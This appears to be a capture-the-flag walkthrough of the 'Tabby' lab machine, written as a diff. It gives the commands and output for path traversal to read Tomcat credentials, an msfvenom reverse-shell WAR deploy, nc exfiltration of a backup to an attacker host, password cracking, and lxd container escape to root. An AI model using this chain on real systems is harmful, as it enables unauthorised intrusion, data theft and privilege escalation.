@@ -1,0 +1,136 @@
+lets' enumerate first:
+command: sudo rustscan -a 10.10.10.194
+result:
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80,8080 10.10.10.194
+result:
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 453c341435562395d6834e26dec65bd9 (RSA)
+|   256 89793a9c88b05cce4b79b102234b44a6 (ECDSA)
+|_  256 1ee7b955dd258f7256e88e65d519b08d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Mega Hosting
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.194/
+
+add this: 10.10.10.194 megahosting.htb
+to /etc/hosts
+
+commnad: gobuster dir -u http://10.10.10.194 -w /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 40
+result:
+/index.php            (Status: 200) [Size: 14175]
+/news.php             (Status: 200) [Size: 0]
+/files                (Status: 301) [Size: 312] [--> http://10.10.10.194/files/]
+/.php                 (Status: 403) [Size: 277]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.10.194/assets/]
+/.php                 (Status: 403) [Size: 277]
+/server-status        (Status: 403) [Size: 277]
+
+access: http://10.10.10.194:8080/
+take attention: 
+news.php
+access: http://10.10.10.194/news.php?file=../../../../etc/passwd
+command: curl http://megahosting.htb/news.php?file=../../../../etc/tomcat9/tomcat-users.xml
+result: blank
+
+command: curl http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
+result:
+<!--
+  NOTE:  The sample user and role entries below are intended for use with the
+  examples web application. They are wrapped in a comment and thus are ignored
+  when reading this file. If you wish to configure these users for use with the
+  examples web application, do not forget to remove the <!.. ..> that surrounds
+  them. You will also need to set the passwords to something appropriate.
+-->
+<!--
+  <role rolename="tomcat"/>
+  <role rolename="role1"/>
+  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+  <user username="role1" password="<must-be-changed>" roles="role1"/>
+-->
+   <role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+
+access: 10.10.10.194:8080/host-manager/html
+username: tomcat
+password: $3cureP4s5w0rd123!
+
+command: curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
+result: 
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:0:/usr/share/tomcat9-examples/examples
+/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
+/manager:running:0:/usr/share/tomcat9-admin/manager
+/docs:running:0:/usr/share/tomcat9-docs/docs
+
+command: msfvenom -p java/shell_reverse_tcp lhost=10.10.16.19 lport=4444 -f war -o rev.war
+command: curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/0xdf --upload-file rev.war
+command: curl http://10.10.10.194:8080/0xdf
+
+command: python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + z
+command: stty raw -echo; fg
+command: reset
+command: screen
+
+command: cd /var/www/html/files
+host> nc -lvnp 7979 > 16162020_backup.zip
+target> cat 16162020_backup.zip | nc 10.10.16.19 7979 
+
+command: zip2john 16162020_backup.zip > 16162020_backup.zip.john
+command: john 16162020_backup.zip.john --wordlist=/home/donika-pentest/Documents/kali_documents/hackthebox/26_postman_easy/rockyou.txt
+
+command: john --show 16162020_backup.zip.john
+result:
+16162020_backup.zip:admin@it
+
+target> su - ash
+password: admin@it
+command: id && whoami
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+ash
+
+take attention: lxd
+
+command: cd /dev/shm
+command: echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
+command: lxd init
+command: lxc image import bob.tar.bz2 --alias bobImage
+To start your first instance, try: lxc launch ubuntu:18.04
+
+command: lxc init bobImage bobVM -c security.privileged=true
+Creating bobVM
+command: lxc config device add bobVM realRoot disk source=/ path=r
+Device realRoot added to bobVM
+
+command: lxc start bobVM
+command: lxc exec bobVM -- /bin/sh
+
+command: id && whoami
+result:
+uid=0(root) gid=0(root) groups=0(root)
+root
+
+command: cat /r/root/root.txt
+result:
+21653c74067d177510074edbcf09a34a
+
+resource:
+https://0xdf.gitlab.io/2020/11/07/htb-tabby.html
